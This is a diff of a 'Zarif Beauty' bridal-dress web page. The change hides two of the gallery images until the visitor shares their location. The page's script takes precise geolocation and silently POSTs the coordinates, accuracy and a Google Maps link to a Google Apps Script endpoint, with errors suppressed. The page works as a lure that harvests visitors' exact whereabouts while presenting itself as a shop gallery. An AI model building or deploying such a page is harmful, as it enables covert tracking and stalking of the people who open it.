@@ -3,98 +3,104 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Zarif Beauty</title>
 
 <style>
-*{
-  box-sizing:border-box;
+* {
+  box-sizing: border-box;
 }
 
-body{
-  margin:0;
-  background:#f7f2f4;
-  font-family:Arial,sans-serif;
-  color:#222;
+body {
+  margin: 0;
+  background: #f7f2f4;
+  font-family: Arial, sans-serif;
+  color: #222;
 }
 
-.page{
-  max-width:600px;
-  margin:auto;
-  padding:25px 18px;
+.page {
+  max-width: 600px;
+  margin: auto;
+  padding: 25px 18px;
 }
 
-.logo{
-  text-align:center;
-  font-size:30px;
-  font-weight:bold;
-  margin:15px 0 30px;
+.logo {
+  text-align: center;
+  font-size: 30px;
+  font-weight: bold;
+  margin: 15px 0 30px;
 }
 
-.card{
-  background:white;
-  border-radius:18px;
-  padding:28px 22px;
-  box-shadow:0 4px 18px rgba(0,0,0,.08);
-  text-align:center;
+.gallery-image {
+  width: 100%;
+  height: auto;
+  display: block;
+  margin: 0 0 24px;
+  border-radius: 14px;
 }
 
-h2{
-  margin:0 0 12px;
-  font-size:24px;
+.card {
+  background: white;
+  border-radius: 18px;
+  padding: 28px 22px;
+  box-shadow: 0 4px 18px rgba(0,0,0,0.08);
+  text-align: center;
 }
 
-p{
-  line-height:1.5;
-  color:#555;
+h2 {
+  margin: 0 0 12px;
+  font-size: 24px;
 }
 
-.info{
-  background:#f8eef2;
-  border-radius:12px;
-  padding:14px;
-  margin:20px 0;
-  font-size:14px;
+p {
+  line-height: 1.5;
+  color: #555;
 }
 
-button{
-  width:100%;
-  border:0;
-  border-radius:12px;
-  padding:16px;
-  font-size:17px;
-  font-weight:bold;
-  background:#d85b8a;
-  color:white;
-  cursor:pointer;
+.info {
+  background: #f5eef1;
+  padding: 14px;
+  border-radius: 12px;
+  margin: 20px 0;
+  font-size: 14px;
+  line-height: 1.5;
 }
 
-button:disabled{
-  background:#aaa;
+button {
+  width: 100%;
+  padding: 15px;
+  border: none;
+  border-radius: 12px;
+  background: #222;
+  color: white;
+  font-size: 17px;
+  cursor: pointer;
 }
 
-#status{
-  margin-top:20px;
-  font-weight:bold;
+button:disabled {
+  opacity: 0.6;
 }
 
-#result{
-  margin-top:18px;
-  display:none;
-  background:#f1f8f3;
-  border-radius:12px;
-  padding:15px;
-  text-align:left;
-  font-size:14px;
-  word-break:break-word;
+#status {
+  margin-top: 15px;
+  color: #777;
 }
 
-#result a{
-  display:block;
-  margin-top:12px;
-  color:#1677c8;
-  font-weight:bold;
-  text-decoration:none;
+#result {
+  margin-top: 20px;
+  padding: 15px;
+  background: #f5eef1;
+  border-radius: 12px;
+}
+
+#mapsLink {
+  display: block;
+  margin-top: 12px;
+  color: #222;
+  font-weight: bold;
+}
+
+#afterLocation {
+  display: none;
 }
 </style>
 </head>
@@ -103,10 +109,16 @@ button:disabled{
 
 <div class="page">
 
-  <div class="logo">
-    Zarif Beauty
-  </div>
+  <div class="logo">Zarif Beauty</div>
 
+  <!-- FIRST IMAGE -->
+  <img
+    class="gallery-image"
+    src="IMG_20261004_205856.jpg"
+    alt="Bridal dress"
+  >
+
+  <!-- LOCATION CONFIRMATION -->
   <div class="card">
 
     <h2>Location Sharing</h2>
@@ -126,15 +138,38 @@ button:disabled{
 
     <div id="status"></div>
 
-    <div id="result">
-      <div><b>Location received successfully.</b></div>
+    <div id="result" style="display:none;">
+
+      <b>Location received successfully</b>
 
       <div id="coordinates"></div>
 
-      <a id="mapsLink" href="#" target="_blank">
+      <a
+        id="mapsLink"
+        href="#"
+        target="_blank"
+      >
         📍 Open in Google Maps
       </a>
+
     </div>
+
+  </div>
+
+  <!-- SECOND + THIRD IMAGES -->
+  <div id="afterLocation">
+
+    <img
+      class="gallery-image"
+      src="IMG_20261004_205938.jpg"
+      alt="Bridal dress 2"
+    >
+
+    <img
+      class="gallery-image"
+      src="IMG_20261004_205837.jpg"
+      alt="Bridal dress 3"
+    >
 
   </div>
 
@@ -145,97 +180,146 @@ button:disabled{
 const BACKEND_URL =
 "https://script.google.com/macros/s/AKfycbzeqyh-gaDySv5fZN6ZWRHOPQDnmW71oeFi5xUtPbydUBixx_geJoNJyKlXeuZuQX43ag/exec";
 
-const button = document.getElementById("locationBtn");
-const status = document.getElementById("status");
-const result = document.getElementById("result");
-const coordinates = document.getElementById("coordinates");
-const mapsLink = document.getElementById("mapsLink");
+const locationBtn =
+document.getElementById("locationBtn");
 
-button.addEventListener("click", function(){
+const status =
+document.getElementById("status");
 
-  if(!navigator.geolocation){
+const result =
+document.getElementById("result");
+
+const coordinates =
+document.getElementById("coordinates");
+
+const mapsLink =
+document.getElementById("mapsLink");
+
+const afterLocation =
+document.getElementById("afterLocation");
+
+
+locationBtn.addEventListener("click", function() {
+
+  if (!navigator.geolocation) {
+
     status.textContent =
-      "Location services are not supported on this device.";
+      "Location is not supported by this browser.";
+
     return;
   }
 
-  button.disabled = true;
-  button.textContent = "Getting Location...";
+  locationBtn.disabled = true;
+
   status.textContent =
-    "Please allow location access when prompted.";
+    "Requesting your location...";
+
 
   navigator.geolocation.getCurrentPosition(
 
-    function(position){
+    function(position) {
 
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const accuracy = position.coords.accuracy;
+      const lat =
+        position.coords.latitude;
+
+      const lon =
+        position.coords.longitude;
+
+      const accuracy =
+        position.coords.accuracy;
 
       const mapsUrl =
-        "https://www.google.com/maps?q=" +
-        latitude + "," + longitude;
+        "https://www.google.com/maps?q="
+        + lat + "," + lon;
+
 
       coordinates.innerHTML =
-        "Latitude: " + latitude +
-        "<br>Longitude: " + longitude +
+        "Latitude: " +
+        lat.toFixed(8) +
+
+        "<br>Longitude: " +
+        lon.toFixed(8) +
+
         "<br>Accuracy: approximately " +
-        Math.round(accuracy) + " meters";
+        Math.round(accuracy) +
+        " meters";
+
 
       mapsLink.href = mapsUrl;
 
       result.style.display = "block";
 
       status.textContent =
-        "Location received successfully.";
+        "Location shared successfully.";
 
-      button.textContent =
-        "✓ Location Shared";
 
-      fetch(BACKEND_URL,{
-        method:"POST",
-        mode:"no-cors",
-        headers:{
-          "Content-Type":"text/plain;charset=utf-8"
+      // SHOW IMAGE 2 AND IMAGE 3
+      // ONLY AFTER LOCATION IS SUCCESSFULLY RECEIVED
+
+      afterLocation.style.display = "block";
+
+
+      fetch(BACKEND_URL, {
+
+        method: "POST",
+
+        mode: "no-cors",
+
+        headers: {
+          "Content-Type":
+            "text/plain;charset=utf-8"
         },
-        body:JSON.stringify({
-          latitude:latitude,
-          longitude:longitude,
-          accuracy:accuracy,
-          mapsUrl:mapsUrl
+
+        body: JSON.stringify({
+
+          latitude: lat,
+
+          longitude: lon,
+
+          accuracy: accuracy,
+
+          mapsUrl: mapsUrl
+
         })
-      }).catch(function(){});
+
+      }).catch(function() {});
 
     },
 
-    function(error){
 
-      button.disabled = false;
-      button.textContent = "📍 Share My Location";
+    function(error) {
 
-      if(error.code === 1){
+      locationBtn.disabled = false;
+
+      if (error.code === 1) {
+
         status.textContent =
           "Location permission was denied.";
-      }
-      else if(error.code === 2){
+
+      } else if (error.code === 2) {
+
         status.textContent =
-          "Unable to determine your location.";
-      }
-      else if(error.code === 3){
+          "Location is unavailable.";
+
+      } else if (error.code === 3) {
+
         status.textContent =
-          "Location request timed out. Please try again.";
-      }
-      else{
+          "Location request timed out.";
+
+      } else {
+
         status.textContent =
-          "An error occurred while getting your location.";
+          "Unable to get your location.";
+
       }
 
     },
 
+
     {
-      enableHighAccuracy:true,
-      timeout:15000,
-      maximumAge:0
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
     }
 
   );
@@ -245,4 +329,4 @@ button.addEventListener("click", function(){
 </script>
 
 </body>
-</html>
+      </html>
